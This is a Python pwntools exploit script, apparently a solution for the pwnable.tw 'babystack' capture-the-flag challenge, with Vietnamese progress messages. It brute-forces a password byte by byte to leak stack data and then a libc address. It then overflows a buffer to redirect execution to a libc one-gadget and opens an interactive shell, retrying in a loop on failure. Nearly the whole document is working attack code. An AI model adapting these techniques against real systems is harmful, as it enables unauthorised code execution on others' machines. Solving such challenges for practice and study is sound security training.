#!/usr/bin/env python3

from pwn import *

exe = ELF('babystack_patched', checksec=False)
libc = ELF('libc_64.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        

        
        ''')
        input()


# if args.REMOTE:
#     p = remote('chall.pwnable.tw', 10205)
# else:
#     p = process([exe.path])

def login(password):
    slna(b'>> ', 1)
    sa(b'passowrd :', password)

def exit():
    slna(b'>> ', 2)

def copy(data):
    slna(b'>> ', 3)
    sa(b'Copy :', data)

def brute_force(s, maximum_len):
    while len(s) < maximum_len:
        byte_found = False

        for i in range(1, 256):
            print(f"testing {i} out of 255\n", end='\r')
            test_bytes = bytes([i])
            password = s + test_bytes
            sl(b'1')
            sla(b'passowrd :', password)

            try:
                response = p.recvuntil(b'>> ', timeout=5) 
                if b'Login Success !' in response:
                    s += test_bytes
                    print(f"[+] Tim thay byte tiep theo: {test_bytes} (Hex: {hex(i)}) | String hien tai: {s} | Len: {len(s)}")
                    byte_found = True
                    sl(b'1')
                    break 
                    
                elif b'Failed !' in response:
                    continue

                else:
                    break

            except Exception as e:
                pass

        if not byte_found:
            print("[-] Khong tim thay byte hop le tiep theo. Dung thuat toan.")
            break

    return s

while True:

    try:

        if args.REMOTE:
            p = remote('chall.pwnable.tw', 10205)
        else:
            p = process([exe.path])

        ###########################################
        ### STAGE 1: Leak password & stack leak ###
        ###########################################
        payload = b''
        maximum_len = 22
        payload = brute_force(payload, maximum_len)

        # GDB()
        print(f"\n[*] Ket qua cuoi cung: {payload}")
        password_success = payload[0:16]
        password_success_8 = payload[0:8]
        password_success_16 = payload[8:16]
        stack_leak = payload[16:24].ljust(8, b'\0')
        info("Password success (0:8): " + hex(u64(password_success_8)))
        info("password success (8:16): " + hex(u64(password_success_16)))
        info("Stack leak: " + hex(u64(stack_leak)))
        login(b'\x00' + b'A'*63 + b'C'*8)
        sleep(5)
        oneshot = [0x4526a, 0xef6c4, 0xf0567]
        payload1 = flat(
            b'A'*63,
            b'B'*16,
            )
        copy(payload1)
        sleep(5)
        sla(b'>> ', b'AAAA')
        p.recvuntil(b'>> Invalid choice', drop=True)
        slna(b'>> ', 1)
        sleep(5)

        ##########################
        ### STAGE 2: Leak libc ###
        ##########################
        payload2 = b'CCCCCCCC'
        maximum_len = 14
        payload2 = brute_force(payload2, maximum_len)
        # GDB()
        print(f"\n[*] Ket qua cuoi cung: {payload2}")
        libc_leak = u64(payload2[8:16].ljust(8, b'\x00'))
        libc.address = libc_leak - 0x78439
        info("Libc leak: " + hex(libc_leak))
        info("Libc base: " + hex(libc.address))

        ########################
        ### STAGE 3: Oneshot ###
        ########################
        oneshot = [0x4526a, 0xef6c4, 0xf0567]
        sleep(5)
        sln(1)
        payload3 = flat(
            b'\x00',
            b'A'*63,
            u64(password_success_8),
            u64(password_success_16),
            b'B'*24,
            p64(libc.address + oneshot[2]),
            )
        sleep(5)
        sla(b'passowrd :', payload3)
        sleep(5)
        copy(b'A'*0x3f)
        sleep(5)
        exit()

        p.interactive()

        break

    except Exception as e:
        print(f"\n[-] Script stopped: {e}")
        print("[*] Restarting...\n")

        try:
            p.close()
        except:
            pass

        sleep(5)